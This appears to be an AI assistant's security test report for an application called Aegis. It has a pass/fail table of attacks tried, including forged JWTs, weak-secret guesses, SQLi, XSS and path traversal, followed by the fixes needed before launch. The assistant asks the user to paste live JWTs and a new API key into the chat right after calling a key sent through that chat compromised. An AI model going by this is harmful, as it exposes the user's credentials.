| Test ID | Attack | Outcome |
|---|---|---|
| R-1.3 | OpenAPI exposed unauth? | PASS (401) |
| R-1.4 | /docs in prod | PASS (404, disabled) |
| JWT-2.1 | alg=none JWT | PASS (rejected) |
| JWT-2.2 | HS256 empty secret | PASS |
| JWT-2.3 | HS256 weak-dict secrets (`secret`, `changeme`, `jwt-secret`, `acp-jwt-secret`, `aegis`) | PASS (all 5 rejected) |
| JWT-2.4 | alg confusion (RS256→HS256, pubkey-as-secret) | PASS |
| JWT-2.6 | Bearer with empty signature | PASS |
| HDR-3.1 | `X-Tenant-ID` alone bypasses auth | PASS |
| HDR-3.2/3.3 | XFF / X-Real-IP spoofing | PASS |
| HDR-3.6 | X-HTTP-Method-Override smuggle | PASS |
| SURF-4.1 | SQLi marker on /audit/logs | PASS |
| SURF-4.2 | Reflected XSS on /demo/scenarios | PASS |
| SURF-4.4 | Path traversal on /receipts | PASS |
| SURF-4.5 | Security headers on /status | PASS (HSTS + X-CTO + CSP + Referrer-Policy + COOP + CORP all present) |
| SURF-4.6 | CORS preflight with arbitrary Origin | PASS (rejected) |
| AUDIT-5.3 | Random receipt id 500-safe | PASS (404) |

---

## What is NOT tested (and why)

I did not run these because they require credentials, infrastructure approval, or the rotated Claude API key. **Tell me when each is ready and I'll execute.**

1. **Authenticated privilege escalation / IDOR / cross-tenant** — need fresh Clerk JWTs from 2 tenants × 3 roles each (VIEWER / DEVELOPER / OWNER). Paste the tokens from DevTools.
2. **100-concurrent Claude adversarial agents against `/execute`** — the Claude API key in your last message is now compromised (it traveled through this chat). Rotate it on https://console.anthropic.com → API Keys, then paste the new one in your next turn. I'll burn that one on this test and not save it anywhere.
3. **API-key abuse simulation** — need 2 distinct `acp_emp_…` tokens from 2 tenants.
4. **DB-level audit-log UPDATE/DELETE** — need either pgbouncer creds or your approval to run an `aws rds-data execute-statement` against the prod DB.
5. **OPA outage / Decision-svc kill / Redis outage** — chaos tests on prod. Need explicit approval; can be done on a fresh staging deploy instead.
6. **Mesh-JWT key rotation drill** — needs a planned maintenance window.

---

## Required fixes BEFORE enterprise pilot

1. P0-1 — create the `scim_tokens` table.
2. P1-1 — fix `/demo/spawn-workspace` so the marketing CTA works.
3. P1-2 — make `/transparency/latest-root` public.
4. P1-3 — strip SQL from unhandled-exception logs.
5. P1-4 — fix SSE reauth for active Clerk sessions.
6. P2-1 — scope WAF Bot Control to unauthenticated requests, revert to Block.

## Required fixes BEFORE public launch

All of the above, plus:

7. P2-2 — fix the source `pgbouncer.aws.ini`; remove deploy-time sed.
8. P2-3 — move mesh-key bootstrap into EC2 user_data.
9. P2-4 — verify the 5/10min rate limit actually fires once P1-1 is fixed.
10. P3-1, P3-2 — UI / API shape consistency.
11. The unverified items in the "NOT tested" section above must all be run with real creds and pass.

## What would make Aegis FAIL a Fortune 500 review today

- **Broken claimed feature (SCIM)** — Fortune 500 security teams ask for SOC2 / ISO27001 evidence. SCIM 2.0 is a CIS-Top-18 control. A control that 500s on every request is worse than no control.
- **Broken demo workflow** — auditors look at the customer-facing surface. A 403 on the headline CTA signals "the rest is probably broken too".
- **WAF in Count mode on a managed rule set** — must be explainable. Without a compensating control (label-based scope-down), this looks like "they turned off WAF because something broke".
- **Workarounds applied at deploy time** — `safe_deploy.sh` sed-fixes the DB hostname AND ASG instances need post-bootstrap env injection. Both look like operational fragility.
- **Stack traces in logs containing schema names** — fails any log-redaction check.

## What would make Aegis PASS a Fortune 500 review

- All P0/P1 closed.
- WAF Bot Control back in Block with a scope-down rule on unauthenticated traffic, evidence in CloudTrail.
- Documented mesh-JWT rotation runbook tested in a drill.
- A signed `/transparency/latest-root` published daily with a verifiable chain, accessible anonymously.
- ASG launch is "boot → bundle pulled → env rendered → all 23 services healthy" in <5 min, with no operator hands.
- 100-concurrent /execute adversarial run shows <5% catch failures on the canonical attack corpus and zero audit-chain gaps.
